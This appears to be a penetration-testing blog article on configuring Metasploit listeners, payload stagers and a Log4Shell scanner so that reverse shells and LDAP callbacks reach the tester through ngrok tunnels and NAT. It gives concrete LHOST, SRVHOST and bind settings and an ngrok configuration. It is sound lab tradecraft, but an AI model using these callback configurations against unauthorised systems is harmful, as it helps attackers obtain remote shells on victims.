---
title: "Metasploit Workflow Tips: Listeners, NAT and Tunnels"
description: "Practical Metasploit notes for reverse listeners and local services when the target reaches you through NAT or a controlled TCP/HTTP tunnel."
category: exploit-development
order: 35
status: published
topics:
  - Metasploit
  - Reverse Connections
  - NAT
  - Tunneling
  - Listener Configuration
relatedResearch: []
relatedArticles:
  - slug: from-vulnerability-analysis-to-exploit-development
    label: From Vulnerability Analysis to Exploit Development
---
## Why the exploit works but the shell does not come back

This one has bitten me more than once.

The exploit request succeeds, the target is clearly vulnerable, but the reverse shell never arrives. In many cases the payload is fine — the problem is simply that the target was told to connect to the wrong address.

It becomes extra confusing when the research machine sits behind NAT or when I use a TCP/HTTP tunnel in a remote lab.

The easiest way to think about it is that there are **two sides**:

```text
target
  |
  | connects to
  v
PUBLIC / TUNNEL ENDPOINT
<tunnel-host>:<public-port>
  |
  | forwards to
  v
LOCAL METASPLOIT LISTENER
0.0.0.0:<local-port>
```

The target needs the public endpoint. Metasploit needs to bind locally.

## Reverse TCP: `LHOST` is not always the bind address

With a tunnel, I may end up with something like:

```text
public side : 6.tcp.eu.ngrok.io:14594
local side  : 0.0.0.0:1970
```

Then the Metasploit settings look like:

```text
set LHOST 6.tcp.eu.ngrok.io
set LPORT 14594

set ReverseListenerBindAddress 0.0.0.0
set ReverseListenerBindPort 1970
```

That is the important trick.

`LHOST` / `LPORT` tell the payload where to connect.  
`ReverseListenerBindAddress` / `ReverseListenerBindPort` tell Metasploit where to listen on my own machine.

They do not need to be the same.

## A small ngrok setup

For a lab I might create one TCP tunnel for a reverse shell and one HTTP tunnel for payload staging.

Do **not** paste a real token into a public config. Use a placeholder or an environment-specific secret.

```yaml
version: "2"
authtoken: <NGROK_AUTHTOKEN>

tunnels:
  reverse_tcp:
    proto: tcp
    addr: 0.0.0.0:1970

  payload_http:
    proto: http
    addr: 0.0.0.0:1981
```

Then:

```shell
ngrok start --all --region eu
```

A session may give you something like:

```text
Forwarding  tcp://6.tcp.eu.ngrok.io:14594 -> 0.0.0.0:1970
Forwarding  https://64db913882c5.eu.ngrok.io -> http://0.0.0.0:1981
```

Now I know exactly which values belong on the public side and which values stay local.

## HTTP stagers: `SRVHOST` versus `URIHOST`

Modules that host a payload add another pair of settings.

For example:

```text
set SRVHOST 0.0.0.0
set SRVPORT 1981

set URIHOST 64db913882c5.eu.ngrok.io
set URIPORT 443
```

Here:

- `SRVHOST` / `SRVPORT` are the local HTTP service;
- `URIHOST` / `URIPORT` are what the target should see in the generated URL.

Again: local bind on one side, public address on the other.

If a module generates a perfect payload URL containing `127.0.0.1`, you know which setting to check.

## Module-specific listeners can use different names

Not every callback comes from a Meterpreter payload.

A good example is the Metasploit Log4Shell scanner, which starts its own LDAP service. For that kind of module you may find settings such as:

```text
ListenerBindAddress
ListenerBindPort
```

A lab configuration can look like:

```text
set SRVHOST 4.tcp.eu.ngrok.io
set SRVPORT 13743

set ListenerBindAddress 0.0.0.0
set ListenerBindPort 389
```

That tells the scanner to advertise the public LDAP endpoint while binding its LDAP server locally on port 389.

The useful habit here is:

```text
options
advanced
```

I check both. Some of the listener magic is hiding under `advanced`.

## Log4Shell scanner example

Here is the kind of setup I used while testing the listener mapping:

```text
msf6 auxiliary(scanner/http/log4shell_scanner) > set srvhost 4.tcp.eu.ngrok.io
srvhost => 4.tcp.eu.ngrok.io

msf6 auxiliary(scanner/http/log4shell_scanner) > set srvport 13743
srvport => 13743

msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindAddress 0.0.0.0
ListenerBindAddress => 0.0.0.0

msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindPort 389
ListenerBindPort => 389
```

The exact module options can change, so I still run `options` and `advanced` on the Metasploit version in front of me.

## My callback troubleshooting order

When a session does not arrive, I go through this in order:

1. Did the vulnerable request actually succeed?
2. What host and port did the payload receive?
3. Can the target reach that public host and port?
4. Does the tunnel forward to the port I think it does?
5. Is Metasploit listening on that local port?
6. Is there a separate `ListenerBind*` or `ReverseListenerBind*` setting?
7. Only then do I start blaming the payload.

That order saves a lot of time.

## A note on remote labs

I use tunneling here as a practical transport mechanism when NAT or lab topology gets in the way. The tunnel does not make a broken payload work; it only gives the target a route back to my listener.

And because tunnel hostnames and ports are often temporary, I re-check the mapping every time I restart the tunnel.

## References

- [Metasploit documentation — Running private modules](https://docs.metasploit.com/docs/using-metasploit/intermediate/running-private-modules.html)
- [ngrok](https://ngrok.com/)
